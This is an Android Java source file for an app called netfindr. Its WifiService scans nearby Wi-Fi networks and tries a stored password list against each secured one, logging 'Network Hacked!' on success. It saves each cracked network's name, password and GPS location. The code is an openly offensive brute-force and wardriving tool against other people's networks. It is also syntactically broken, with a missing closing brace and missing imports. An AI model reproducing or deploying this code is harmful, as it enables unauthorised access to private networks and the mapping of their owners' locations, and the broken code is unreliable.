package nz.frontdoor.netfindr;

import android.app.IntentService;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.Context;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.SupplicantState;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.InterruptedIOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.concurrent.CountDownLatch;

import nz.frontdoor.netfindr.services.Database;
import nz.frontdoor.netfindr.services.Network;
import nz.frontdoor.netfindr.services.Password;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p/>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class WifiService extends IntentService {
    public static final String BROADCAST_ACTION = "nz.frontdoor.netfindr.WifiService";
    public static final String EXTENDED_DATA_STATUS = "nz.frontdoor.netfindr.STATUS";

    private static final String TAG = "WIFISERVICE";
    public static Context context;

    private List<ScanResult> networks;
    private List<Password> passwords;

    private LocationManager locationManager;
    private Location location;
    private WifiManager wifi;
    private BroadcastReceiver wifiScanReciver;
    private BroadcastReceiver wifiConnectionReciver;

    private ScanResult current;
    private Boolean asociated = false;
    private CONNECTION_ATTEMPT_RESULT currentRes;
    private ThreadEvent scanComplete = new ThreadEvent();
    private Database database;

    private enum CONNECTION_ATTEMPT_RESULT {
        SUCCESS,
        FAILURE,
    }

    private enum SECURITY_TYPE {
        DONT_EVEN,
        WPA2,
        WPA,
        WEP,
        NONE
    }

    public WifiService() {
        super("WifiService");
        Log.v(TAG, "Service Created");

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            throw new RuntimeException();
        }

        locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        networks = new ArrayList<>();
        database = new Database(context);
        passwords = database.getPasswords();
        wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);

        wifiConnectionReciver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                SupplicantState supl_state=((SupplicantState)intent.getParcelableExtra(WifiManager.EXTRA_NEW_STATE));
                switch(supl_state){
                    case ASSOCIATED:
                        Log.v("SupplicantState", "ASSOCIATED");
                        synchronized (asociated) {
                            asociated = true;
                        }
                        break;
                    case ASSOCIATING:
                        Log.v("SupplicantState", "ASSOCIATING");
                        synchronized (asociated) {
                            asociated = true;
                        }
                        break;
                    case AUTHENTICATING:
                        Log.v("SupplicantState", "Authenticating...");
                        break;
                    case COMPLETED:
                        Log.v("SupplicantState", "Connected");
                        synchronized (asociated) {
                            asociated = false;
                        }

                        currentRes = CONNECTION_ATTEMPT_RESULT.SUCCESS;
                        scanComplete.signal();
                        break;
                    case DISCONNECTED:
                        Log.v("SupplicantState", "Disconnected");
                        synchronized (asociated) {
                            if (asociated) {
                                currentRes = CONNECTION_ATTEMPT_RESULT.FAILURE;
                                scanComplete.signal();
                            }
                        }

                        break;
                    case DORMANT:
                        Log.v("SupplicantState", "DORMANT");
                        break;
                    case FOUR_WAY_HANDSHAKE:
                        Log.i("SupplicantState", "FOUR_WAY_HANDSHAKE");
                        break;
                    case GROUP_HANDSHAKE:
                        Log.i("SupplicantState", "GROUP_HANDSHAKE");
                        break;
                    case INACTIVE:
                        Log.i("SupplicantState", "INACTIVE");
                        break;
                    case INTERFACE_DISABLED:
                        Log.i("SupplicantState", "INTERFACE_DISABLED");
                        break;
                    case INVALID:
                        Log.i("SupplicantState", "INVALID");
                        break;
                    case SCANNING:
                        //Log.i("SupplicantState", "SCANNING");
                        break;
                    case UNINITIALIZED:
                        Log.i("SupplicantState", "UNINITIALIZED");
                        break;
                    default:
                        Log.i("SupplicantState", "Unknown");
                        break;

                }

                int supl_error=intent.getIntExtra(WifiManager.EXTRA_SUPPLICANT_ERROR, -1);
                if(supl_error==WifiManager.ERROR_AUTHENTICATING){
                    Log.i("ERROR_AUTHENTICATING", "ERROR_AUTHENTICATING!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
                    currentRes = CONNECTION_ATTEMPT_RESULT.FAILURE;
                    scanComplete.signal();
                }
            }
        };
        context.registerReceiver(wifiConnectionReciver, new IntentFilter(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION));
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            final String action = intent.getAction();
            Log.v(TAG, "Action Received: " + action);

            if (wifi.isWifiEnabled() == false) {
                Log.v(TAG, "Wifi was disabled... Enabling");
                Toast.makeText(context, "Wifi is Disabled... Enabling", Toast.LENGTH_LONG).show();
                wifi.setWifiEnabled(true);
            }

            SUPRHAKRFUNC();
        }
    }

    private void SUPRHAKRFUNC() {
        // Start a peroic scan
        boolean s = wifi.startScan();
        Log.v(TAG, "Scan Status -> " + s);


        while (true) {
            int id = -1;
            scanNetworks();

            ScanResult sr = null;
            if (!networks.isEmpty()) {
                sr = networks.remove(0);
            }

            if (sr == null) {
                Log.v(TAG, "No networks to HAK... sleeping");
                try {
                    Thread.sleep(10000, 0);
                    continue;
                } catch (Exception e) {

                }
            }

            Log.v(TAG, "Scanning Network -> " + sr.SSID);


            SECURITY_TYPE security_type = getSecurityType(sr);
            Log.d(TAG, "Network Security -> " + security_type.toString());

            if (security_type == SECURITY_TYPE.NONE) {
                Log.v(TAG, "Skipping Network... No Security");
                continue;
            }

            if (security_type == SECURITY_TYPE.DONT_EVEN) {
                Log.v(TAG, "Skipping Network... Just NO. Just NOOOOOO");
                continue;
            }

            boolean success = false;
            for (Password password : passwords) {
                WifiConfiguration wifiConfiguration = new WifiConfiguration();
                wifiConfiguration.SSID = String.format("\"%s\"", sr.SSID);
                wifiConfiguration.preSharedKey = String.format("\"%s\"", password.getPhrase());
                wifiConfiguration.status = WifiConfiguration.Status.ENABLED;

                synchronized (wifi) {
                    id = wifi.addNetwork(wifiConfiguration);
                    boolean enabled = wifi.enableNetwork(id, true);
                }

                try {
                    scanComplete.await();
                } catch(InterruptedException e) {
                    throw new RuntimeException();
                }

                synchronized (currentRes) {
                    if (currentRes == CONNECTION_ATTEMPT_RESULT.SUCCESS) {
                        success = true;
                        Log.v(TAG, "Network Hacked!, SSID -> " + sr.SSID + ", password -> " + password.getPhrase());

                        Location l = getLocation();
                        database.addNetwork(Network.SuccessfulConnection(
                                sr.SSID,
                                password,
                                l.getLatitude(), l.getLongitude(),
                                security_type.toString(),
                                new Date()
                        ));

                        sendBroadcast();
                        wifi.removeNetwork(id);
                        break;
                    } else {
                        Log.v(TAG, "Network Not Hacked, SSID -> " + sr.SSID + ", password -> " + password.getPhrase());
                        wifi.removeNetwork(id);
                        sendBroadcast();
                    }
                }
            }
            if (!success) {
                Location l = getLocation();
                database.addNetwork(Network.UnsuccessfulConnection(
                        sr.SSID,
                        l.getLatitude(), l.getLongitude(),
                        security_type.toString(),
                        new Date()));

                wifi.removeNetwork(id);
                sendBroadcast();
            }
        }
    }

    private void scanNetworks() {
        List<ScanResult> scanResults;

        synchronized (wifi) {
            scanResults = wifi.getScanResults();
        }

        int u = 0;
        for (ScanResult r : scanResults) {

            // TMP
            boolean e = false;
            for (ScanResult n : networks) {
                if (n.SSID.equals(r.SSID)) {
                    e = true;
                }
            }


            if (!e && !database.isKnownNetwork(r.SSID)) {
                networks.add(r);
                u++;
            }
        }

        Log.v(TAG, "Scan Completed -> " + scanResults.size() + " networks found, " + u + " uniquic. [total = " + networks.size() + "]");
    }

    private Location getLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            throw new RuntimeException();
        }
        return locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
    private void sendBroadcast() {
        Intent localIntent = new Intent(WifiService.BROADCAST_ACTION).putExtra(WifiService.EXTENDED_DATA_STATUS, "ALIVE");
        LocalBroadcastManager.getInstance(context).sendBroadcast(localIntent);
    }

    private static SECURITY_TYPE getSecurityType(ScanResult s) {
        String c = s.capabilities;

        if (c.contains("TKIP")) {
            return SECURITY_TYPE.DONT_EVEN;
        } else if (c.contains("WPA2")) {
            return SECURITY_TYPE.WPA2;
        } else if (c.contains("WPA")) {
            return SECURITY_TYPE.WPA;
        } else if (c.contains("WEP")) {
            return SECURITY_TYPE.WEP;
        }

        return SECURITY_TYPE.NONE;
    }
}
